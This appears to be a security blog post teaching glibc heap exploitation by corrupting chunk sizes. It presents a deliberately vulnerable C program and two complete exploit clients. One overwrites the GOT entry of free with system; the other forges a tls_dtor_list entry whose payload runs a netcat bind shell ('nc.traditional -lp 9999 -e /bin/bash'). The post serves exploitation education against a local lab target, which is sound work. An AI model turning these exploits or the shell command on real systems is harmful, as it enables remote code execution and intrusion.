---
layout: default
title:  "The macabre dance of memory chunks"
date:   2017-09-16 10:52:43 +0200
categories: heap-based overflow, exploits
---

In this post, we want to share some notes on how to exploit heap-based overflow
vulnerabilities by corrupting the size of memory chunks. Please note that we do
not present here original content but only want to share with the community two
detailed write-up. The first one exploits a basic heap-based overflow by
enlarging the size of memory chunks. The second one shrinks their sizes in
order to turn a NULL byte off-by-one error – present in a hardened binary (all
memory corruption mitigations are enabled) – into remote code execution.

All sample code used in this blogpost is available for download
[here](https://github.com/mtalbi/write-up/tree/master/heap)

## Memory chunks

Before going further, we strongly encourage the reader to go through glibc
malloc internals. The post made by [sploitfun][sploitfun] is probably the best
documentation on glibc allocator (ptmalloc2). Here we just recap the structure
of an allocated/free memory chunks:

![]({{site.baseurl}}/images/chunks.png)
*Figure 1 – Two allocated chunks (left) – Free chunk + allocated chunk (right)*

## Corrupting chunk sizes

There is several techniques to exploit a heap-based overflow. In the following,
we will focus on the techniques presented in [Goichon’s paper][goichon] that
consist in overflowing the chunk size field. Either enlarging or reducing the
size of memory chunks could lead to interesting scenarios where one can overlap
a memory chunk into another chunk. If the overlapped chunk contains memory
pointers, then an attacker can overwrite them to leak sensitive data and/or to
execute code.

The figure below illustrates the first scenario where the size of a chunk is
extended. If we manage to (i) allocate three contiguous chunks, namely A, B and
C, (ii) free the second one B and extend its size, (iii) allocate a larger
chunk than previously requested for B, then chunk C will be overlapped.

![]({{site.baseurl}}/images/extending.png)
*Figure 2 – Extending memory chunk size*

Shrinking the size of chunks to produce overlapping chunks is more complex.
Figure 3 illustrates the different steps leading to overlapping chunks. First,
we allocate three large contiguous chunks A, B and C. Then, we free chunk B and
shrink its size by overwriting the chunk size field. In the third step, we
allocate two chunks B_1 and B_2 that feet on that freed chunk. As the size of
chunk B has been corrupted, the prev_size of chunk C will not be updated and
thus the freed B’s space is unused from C’s perspective. Now, if we free the
chunk B_1 and chunk C, then chunks B_1, B_2 and C will be merged. A subsequent
allocation larger than B_1 initial size will overlap chunk B_2.  For further
infomration about this technique, please refer to [Tavis Ormandi’s
code][tavis].

![]({{site.baseurl}}/images/shrinking.png)
*Figure 3 – Shrinking memory chunk size*

## The vulnerable code

Since the solutions of the challenges we did are meant not to published, we
decided to create a new one by reworking slightly the war game from the
excellent [blackngel’s Phrack paper][blackngel].

The code below manages a set of agents with basic operations (creation,
deletion, profile edition and modification).

When a new agent is created, two memory chunks are allocated. The first one
holds a pointer to the agent name along with the length of the agent name, the
agent id, and some reserved data. The second chunk holds the agent name pointed
to by field name of the first chunk. Those two chunks are freed when agents are
deleted.

The vulnerability stems from insufficient reserved space to hold the agent
name. More precisely, the allocated chunk at line 89 does not account for the
2-chars  (“A_”) that prefix agent names. Therefore, we can overflow a chunk
with two bytes and hence corrupt the size of the next chunk.

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#define MAX_AGENT 256
 
void main_menu(void);
 
void agent_create(void);
void agent_show(void);
void agent_select(void);
void agent_delete(void);
void agent_edit(void);
 
int agent_edit_name(char *buffer, int size);
 
typedef struct agent {
	unsigned int   size;
	unsigned long  reserved_0;
	char		  *name;
	unsigned int   id;
	char		   reserved_1[128];
} agent_t;
 
agent_t *agents[MAX_AGENT];
unsigned int agent_count = 0;
unsigned int agent_sel = 0;
unsigned int global_id = 0;
 
int main(int argc, char *argv[])
{
	main_menu();
	return 0;
}
 
void main_menu(void)
{
	int op = 0;
	char opt[2];
 
	printf("\n\t\t\t\t[1] Create new agent");
	printf("\n\t\t\t\t[2] Select agent");
	printf("\n\t\t\t\t[3] Show agent");
	printf("\n\t\t\t\t[4] Edit agent");
	printf("\n\t\t\t\t[5] Delete agent");
	printf("\n\t\t\t\t[0] <- EXIT");
	printf("\n\t\t\t\tSelect your option:");
	fflush(stdout);
	fgets(opt, 3, stdin);
 
	op = atoi(opt);
 
	switch (op) {
		case 1:
			agent_create();
			break;
		case 2:
			agent_select();
			break;
		case 3:
			agent_show();
			break;
		case 4:
			agent_edit();
			break;
		case 5:
			agent_delete();
			break;
		case 0:
			exit(0);
		default:
			break;
	}
 
	main_menu();
}
 
void agent_create(void)
{
 
	char buffer[4096];
	int len;
 
	if (agent_count < MAX_AGENT) {
		agents[agent_count] = malloc(sizeof(agent_t));
 
		len = agent_edit_name(buffer, 4096);
		agents[agent_count]->name = malloc(len + 1);
		strncpy(agents[agent_count]->name, "A_", 2);
		memcpy(agents[agent_count]->name + 2, buffer, len);
		agents[agent_count]->name[len + 2] = '\0';
		agents[agent_count]->size = len + 2 + 1;
 
		agents[agent_count]->reserved_0 = 0;
		memset(agents[agent_count]->reserved_1, '\0', 128);
 
		agents[agent_count]->id = global_id++;
 
		agent_sel = agent_count++;
		printf("\n[+] Agent %d selected.", agents[agent_sel]->id);
	}
}
 
void agent_select(void)
{
	char ag_id[4];
	int ag, i = 0;
	printf("\nWrite agent number:");
	fflush(stdout);
	read(0, ag_id, 3);
	ag = atoi(ag_id);
 
	while (i < agent_count && agents[i]->id != ag) {
		i++;
	}
 
	if (i == agent_count) {
		printf("\n[!] No such agent [%d], select another", ag);
	}
	else {
		agent_sel = i;
		printf("\n[+] Agent %d selected.", agents[agent_sel]->id);
	}
}
 
void agent_edit(void)
{
	char buffer[4096];
	int len;
	if (agent_count > 0) {
		len = agent_edit_name(buffer, 4096);
		if (len + 1 > agents[agent_sel]->size) {
			agents[agent_sel]->name = realloc(agents[agent_sel]->name, len + 1);
		}
		memcpy(agents[agent_sel]->name, buffer, len);
		agents[agent_sel]->name[len] = '\0';
	}
	else {
		printf("\n[!] No agents to edit");
	}
}
 
int agent_edit_name(char *buffer, int size)
{
	int len = 0;
	printf("\nEdit agent name:");
	fflush(stdout);
	len = read(0, buffer, size - 1);
	if (len > 0 && buffer[len-1] == '\n') len--;
	buffer[len] = '\0';
	return len;
}
 
void agent_delete(void)
{
	if (agent_count > 0) {
		free(agents[agent_sel]->name);
		free(agents[agent_sel]);
		agent_count--;
		if (agent_count != agent_sel) {
			agents[agent_sel] = agents[agent_count];
			printf("\n[+] Agent %d selected.", agents[agent_sel]->id);
		}
		else {
			agent_sel = 0;
			if (agent_count > 0) {
				printf("\n[+] Agent %d selected.", agents[agent_sel]->id);
			}
			else {
				printf("\n[+] No more agents.");
			}
		}
	}
	else {
		printf("\n[!] No agents to delete");
	}
}
 
void agent_show(void)
{
	if (agent_count > 0) {
		printf("\n[+] Agent %d: ", agents[agent_sel]->id);
		fflush(stdout);
		write(1, agents[agent_sel]->name, agents[agent_sel]->size);
	}
	else {
		printf("\n[!] No available agents");
	}
}
{% endhighlight %}

## Write-up – The easy way

Notice that we cannot apply directly the scenario depicted in figure 2. Indeed,
if we create three agents and delete the second one, then we cannot enlarge the
size of the freed and merged chunks enough to reach interesting data of the
third agent. As stated earlier we can overwrite a chunk with only two bytes
(one byte + NULL byte). So, we need to shape the heap beforehand so that we can
get two adjacent chunks holding agent’s names.

Figure 4 sums up the steps to shape the heap:

1.   We create two agents Ag_0 and Ag_1.

1.   We delete agent Ag_0.

1.   We create a new agent Ag_2 by requesting a large size to store its name
than for Ag_0. The chunk holding the name of agent Ag_2 is allocated next to
the chunk holding the name og agent Ag_1.

1.   We create a new agent Ag_3 that represents the target to overlap.

1.   We create an additional agent Ag_4 that holds the strings “/bin/sh”. Our goal
is to execute a shell by calling system(“/bin/sh”).

![]({{site.baseurl}}/images/heap_shape_easy.png)
*Figure 4 – Shaping the heap*

The next step is delete agent Ag_2 and corrupt the size of the chunk holding
its name (see Figure 5). Now, if we create a new agent Ag_5 on the space left
free by agent Ag_2, then the chunk holding the main structure of agent Ag_3
will be overlapped. In our case, we point the name’s pointer to free‘s GOT
entry.

If we dump, the data (agent_show) of agent Ag_3, we can leak the address of a
libc function and deduce where system address is mapped to.

The final attack stage is to edit the data (agent_edit) of agent Ag_3 to
redirect free() calls to system() calls. Now, if we delete Ag_4, we got a
shell.

![]({{site.baseurl}}/images/heap_exploit_easy.png)
*Figure 5 – Overflowing and overlapping next chunk*

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <inttypes.h>
 
#define HOSTNAME  "localhost"
#define PORT	  5555
#define GOTFREE   0x6015d8
#define SYSOFFSET 0x3b160
 
#define COLOR_SHELL "\033[31;01mshell\033[00m > "
 
int  setsock(char *hostname, int port);
void send_data(char *input, int len);
void session();
int  handle_error(char *msg);
 
void agent_create_ex(char c, int len);
void agent_create(char *buffer, int len);
void agent_select(int agent);
void agent_show(int agent, char *buffer, size_t len);
void agent_edit(int agent, char *buffer, int len);
void agent_delete(int agent);
 
void select_option(char *opt);
 
struct fake_agent {
	unsigned long chunk_size;
	unsigned int  len;
	unsigned long reserved_0;
	unsigned long name;
	unsigned int  id;
};
 
int sock;
 
int main()
{
	unsigned long system, free;
	struct fake_agent agent;
	char output[1024], input[1024];
 
	printf("[1] connecting to target ...\n");
	sock = setsock(HOSTNAME, PORT);
	printf("[+] connected\n");
	read(sock, output, 1024);
 
	printf("[2] shaping heap\n");
	agent_create_ex('A', 0x88 - 1);
	agent_create_ex('B', 0x88 - 1);
	agent_delete(0);
	agent_create_ex('C', 0xa0 + 2);
	agent_create_ex('D', 0xa0 + 2);
	agent_create_ex('E', 0x10);
	agent_edit(4, "/bin/sh", 7);
 
	printf("[3] overflowing next chunk\n");
	agent_delete(2);
	memset(input, 'B', 0x88);
	input[0x88] = 0xf1;
	agent_edit(1, input, 0x88 + 1);
 
	printf("[4] overlapping next chunk\n");
	agent.chunk_size = 0xb1;
	agent.len = 0xff;
	agent.reserved_0 = 0xdeadbeef;
	agent.name = GOTFREE;
	agent.id = 3;
 
	memset(input, 'F', 0xa6);
	memcpy(input + 0xa6, &agent, sizeof(struct fake_agent));
	agent_create(input, 0xa6 + sizeof(struct fake_agent));
 
	agent_show(3, output, sizeof(output));
	free = *((unsigned long *)(output));
	printf("[+] free function mapped at 0x%"PRIx64"\n", free);
	system = free - SYSOFFSET;
 
	printf("[+] system function mapped at 0x%"PRIx64"\n", system);
 
	printf("[5] pwning\n");
	agent_edit(3, (char *)&system, 6);
	agent_delete(4);
 
	session();
 
	return 0;
}
 
void agent_create(char *buffer, int len)
{
	select_option("1");
	send_data(buffer, len);
}
 
void agent_create_ex(char c, int len)
{
	char buffer[len];
	memset(buffer, c, len);
	agent_create(buffer, len);
}
 
void agent_select(int agent)
{
	char ag[4];
	int len = snprintf(ag, 4, "%d", agent);
	select_option("2");
	send_data(ag, len);
}
 
void agent_show(int agent, char *buffer, size_t len)
{
	int amt;
	agent_select(agent);
	write(sock, "3\n", 2);
	read(sock, buffer, len);
	amt = read(sock, buffer, len);
	buffer[amt] = '\0';
}
 
void agent_edit(int agent, char *buffer, int len)
{
	agent_select(agent);
	select_option("4");
	send_data(buffer, len);
}
 
void agent_delete(int agent)
{
	agent_select(agent);
	select_option("5");
}
 
void select_option(char *opt)
{
	send_data(opt, 2);
}
 
void send_data(char *input, int len)
{
	char output[1024];
	int amt;
	fd_set fds;
	struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
 
	write(sock, input, len);
 
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
 
	select(sock+1, &fds, NULL, NULL, &tv);
 
	if (FD_ISSET(sock, &fds)) {
		if ((amt = read(sock, output, 1024 - 1)) == 0) {
			handle_error("connection lost\n");
		}
		output[amt] = '\0';
	}
}
 
int setsock(char *hostname, int port)
{
	int s;
	struct hostent *hent;
	struct sockaddr_in sa;
	struct in_addr ia;
 
	hent = gethostbyname(hostname);
	if (hent) {
		memcpy(&ia.s_addr, hent->h_addr, 4);
	}
	else if((ia.s_addr = inet_addr(hostname)) == INADDR_ANY) {
		handle_error("incorrect address !!!\n");
	}
 
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		handle_error("socket failed !!!\n");
	}
 
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = ia.s_addr;
 
	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
		handle_error("connection failed !!!!\n");
	}
 
	return s;
}
 
void session()
{
	char buf[1024];
	int amt;
	fd_set fds;
 
	printf("[!] enjoy your shell \n");
	fputs(COLOR_SHELL, stderr);
 
	while (1) {
		FD_ZERO(&fds);
		FD_SET(sock, &fds);
		FD_SET(0, &fds);
 
		if (select(sock+1, &fds, NULL, NULL, NULL) == -1) {
			continue;
		}
 
		if (FD_ISSET(0, &fds)) {
			if ((amt = read(0, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			write(sock, buf, strlen(buf));
		}
 
		if (FD_ISSET(sock, &fds)) {
			if ((amt = read(sock, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			printf("%s", buf);
			fputs(COLOR_SHELL, stderr);
		}
	}
}
 
int handle_error(char *msg)
{
	perror(msg);
	exit(-1);
}
{% endhighlight %}

## Write-up – The hard way

Assume now that we apply the following patch to the vulnerable code. Ok, that
is better but the code is still vulnerable to an off-by-one heap-based
overflow. We cannot enlarge the size of chunks but if we allocate large ones,
we can shrink them by overwritting the LSB of the chunk size with a NULL byte.

{% highlight c %}
88c88
< 		agents[agent_count]->name = malloc(len + 1);
---
> 		agents[agent_count]->name = malloc(len + 2);
92c92
< 		agents[agent_count]->size = len + 2 + 1;
---
> 		agents[agent_count]->size = len + 2;
{% endhighlight %}

The scenario depicted in Figure 3 cannot be applied in one go. We need first to
shape the heap in order to produce overlapping chunks.

A closer look at the patch shows that we cannot overflow chunks while editing
agents. The chunk size can be corrupted only during agent creation. So the only
way to corrupt the chunk size is to allocate a fastbin chunk followed by a
large chunk, then free both of them and finally reallocate the fastbin chunk by
overflowing this time the size of the next chunk. We rely on a fastbin chunk
since it is not merged with adjacent chunks when freed.

Figure 6 sums up the steps to shape the heap:

1.   We create two agents Ag_0 and Ag_1. A fast bin chunk is allocated to hold
the name of agent Ag_1.

1.   We delete Agent Ag_0.

1.   We create two agents Ag_2 and Ag_3 by requesting large sizes to hold their names.

1.   We delete Ag_2 and Ag_1.

![]({{site.baseurl}}/images/heap_shape_hard.png)
*Figure 6 – Shaping the heap*

Now, we are ready to overwrite the size of the previously freed chunk
(structure holding Ag_2’s name) by requesting small size (we need a fast bin
allocation) for the newly created agent Ag_4.

Then, we create three additional agents Ag_5, Ag_6 and Ag_7 that fit in memory
on the free space left by Ag_2. Once deleting Ag_5, Ag_7 and Ag_3, the chunks
holding Ag_6’s data will be overlapped if we create a new agent as shown below:

![]({{site.baseurl}}/images/heap_exploit_hard.png)
*Figure 7 – Overflowing and overlapping next chunk*

Note that we created agent Ag_7 and deleted it in the sole purpose to get fd and
bk pointers adjacent to the structure holding the name of agent Ag_6. These
addresses will be leaked later in order to resolve some libc addresses.

In our exploit, we create a new agent Ag_8 such that its data overlaps the len
field of agent Ag_6. Dumping the data of this agent will leak the address the
fd pointer from which we can deduce the address of system in libc address
space.

Note that in our example, we assume that the binary has been hardened by
enabling all gcc’s memory corruption mitigation flags. This means that we
cannot rely on the previously technique to overwrite a GOT entry.

Our goal to achieve code execution is to create a fake tls_dtor_list which is a
single linked list of functions that run at program exit:

The address of the tls_dtor_list pointer could be derived by setting a pointer
on function __call_tls_dtors which iterates over the tls_dtor_list:

![]({{site.baseurl}}/images/tls_dtor_list.png){: .center}
*Figure 8 – Getting the tls_dtor_list pointer address*

This pointer will be used to overwrite the name pointer of agent Ag_6 when
editing the data of agent Ag_8. Finally, we edit the data of agent_6 that
points now to tls_dotr_list and copy there our fake tls_dtor_entry.

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <inttypes.h>
 
#define HOSTNAME  "localhost"
#define PORT	  5555
 
#define SYS_OFFSET 0x362198
#define TLS_OFFSET 0x1ff038
 
#define COLOR_SHELL "\033[31;01mshell\033[00m > "
 
int  set_sock(char *hostname, int port);
void send_data(char *input, int len);
void session(int fd);
int  handle_error(char *msg);
 
void agent_create(char c, int len);
void agent_select(int agent);
void agent_show(int agent, char *buffer, size_t len);
void agent_edit(int agent, char *buffer, int len);
void agent_delete(int agent);
void agent_exit();
 
void select_option(char *opt);
 
struct fake_agent {
	unsigned int  len;
	unsigned long reserved_0;
	unsigned long name;
	unsigned int  id;
};
 
struct fake_tls_dtor_entry {
	unsigned long ret;
	unsigned long func;
	unsigned long obj;
	char		  data[40];
};
 
int sock;
int retrieve = 1;
 
int main()
{
	char output[1024], input[1024];
	struct fake_agent agent;
	struct fake_tls_dtor_entry pown;
	unsigned long leak, system, tls_dtor_list;
	int sock2;
 
	printf("[1] connecting to target ...\n");
	sock = setsock(HOSTNAME, PORT);
	printf("[+] connected\n");
	read(sock, output, 1024);
 
	printf("[2] shaping heap\n");
	agent_create('A', 0xa0 - 4);
	agent_create('B', 0x18 - 4);
	agent_delete(0);
	agent_create('C', 0x410 - 4);
	agent_create('D', 0x400 - 4);
	agent_delete(2);
	agent_delete(1);
 
	printf("[3] overflowing next chunk\n");
	agent_create('E', 0x18 - 2);
	agent_create('F', 0x200 - 4);
	agent_create('G', 0xe0 - 4);
	agent_create('H', 0x18 - 4);
	agent_delete(7);
	agent_delete(5);
	agent_delete(3);
 
	agent_create('\xff', 0x210 - 1);
	agent_show(6, output, sizeof(output));
 
	leak = *((unsigned long *)(output + 240));
	system = leak - SYS_OFFSET;
	printf("[+] system function mapped at 0x%"PRIx64"\n", system);
	tls_dtor_list = leak + TLS_OFFSET;
	printf("[+] tls_dtor_list pointer at 0x%"PRIx64"\n", tls_dtor_list);
 
	printf("[4] overlapping next chunk\n");
	agent.len = 0xff;
	agent.reserved_0 = 0xdeadbeef;
	agent.name = tls_dtor_list;
	agent.id = 6;
	memset(input, 'X', 0x210);
	memcpy(input + 0x210, &agent, sizeof(struct fake_agent));
	agent_edit(8, input, 0x210 + sizeof(struct fake_agent));
 
	pown.ret = tls_dtor_list + 0x8;
	pown.func = system;
	pown.obj = tls_dtor_list + 0x18;
	strcpy(pown.data, "nc.traditional -lp 9999 -e /bin/bash");
 
	agent_edit(6, (char *)&pown, sizeof(struct fake_tls_dtor_entry));
 
	printf("[5] powning\n");
	retrieve = 0;
	agent_exit();
 
	sleep(2);
 
	close(sock);
	sock2 = setsock(HOSTNAME, 9999);
	session(sock2);
 
	return 0;
}
 
void agent_exit()
{
	select_option("0");
}
 
void agent_create(char c, int len)
{
	char buffer[len];
	memset(buffer, c, len);
	select_option("1");
	send_data(buffer, len);
}
 
void agent_select(int agent)
{
	char ag[4];
	int len = snprintf(ag, 4, "%d", agent);
	select_option("2");
	send_data(ag, len);
}
 
void agent_show(int agent, char *buffer, size_t len)
{
	int amt;
	agent_select(agent);
	write(sock, "3\n", 2);
	read(sock, buffer, len - 1);
	amt = read(sock, buffer, len - 1);
	buffer[amt] = '\0';
}
 
void agent_edit(int agent, char *buffer, int len)
{
	agent_select(agent);
	select_option("4");
	send_data(buffer, len);
}
 
void agent_delete(int agent)
{
	agent_select(agent);
	select_option("5");
}
 
void select_option(char *opt)
{
	send_data(opt, 2);
}
 
void send_data(char *input, int len)
{
	char output[1024];
	int amt;
	write(sock, input, len);
	if (retrieve) {
		amt = read(sock, output, sizeof(output) - 1);
		output[amt] = '\0';
	}
}
 
int setsock(char *hostname, int port)
{
	int s;
	struct hostent *hent;
	struct sockaddr_in sa;
	struct in_addr ia;
 
	hent = gethostbyname(hostname);
	if (hent) {
		memcpy(&ia.s_addr, hent->h_addr, 4);
	}
	else if((ia.s_addr = inet_addr(hostname)) == INADDR_ANY) {
		handle_error("incorrect address !!!\n");
	}
 
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		handle_error("socket failed !!!\n");
	}
 
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = ia.s_addr;
 
	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
		handle_error("connection failed !!!!\n");
	}
 
	return s;
}
 
void session(int sock)
{
	char buf[1024];
	int amt;
	fd_set fds;
 
	printf("[!] enjoy your shell \n");
	fputs(COLOR_SHELL, stderr);
 
	while (1) {
		FD_ZERO(&fds);
		FD_SET(sock, &fds);
		FD_SET(0, &fds);
 
		if (select(sock+1, &fds, NULL, NULL, NULL) == -1) {
			continue;
		}
 
		if (FD_ISSET(0, &fds)) {
			if ((amt = read(0, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			write(sock, buf, strlen(buf));
		}
 
		if (FD_ISSET(sock, &fds)) {
			if ((amt = read(sock, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			printf("%s", buf);
			fputs(COLOR_SHELL, stderr);
		}
	}
}
 
int handle_error(char *msg)
{
	perror(msg);
	exit(-1);
}
{% endhighlight %}

![]({{site.baseurl}}/images/woot.png){: .center}

[sploitfun]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
[goichon]: http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
[tavis]: https://bugs.chromium.org/p/project-zero/issues/detail?id=96&redir=1
[blackngel]: http://phrack.org/issues/67/8.html#article
